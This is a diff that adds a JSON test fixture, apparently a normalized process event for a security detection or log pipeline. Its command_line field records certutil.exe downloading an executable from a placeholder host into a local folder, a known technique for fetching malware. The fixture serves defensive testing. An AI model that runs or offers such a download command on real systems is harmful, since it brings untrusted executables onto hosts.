@@ -1,0 +1,22 @@
+{
+  "event_id": "207a990d-8562-4dfe-80ab-a59ea9a79b90",
+  "timestamp": "2026-01-01T00:00:00Z",
+  "event_category": "process",
+  "action": null,
+  "outcome": "success",
+  "source": "tests",
+  "source_type": "operating_system",
+  "actor": null,
+  "source_endpoint": null,
+  "destination_endpoint": null,
+  "process": {
+    "name": "certutil.exe",
+    "pid": null,
+    "command_line": "certutil -urlcache -split -f http://x/1.exe c:\\t\\1.exe",
+    "executable": null,
+    "parent_process": null
+  },
+  "file": null,
+  "normalized_data": {},
+  "provenance": "observed"
+}
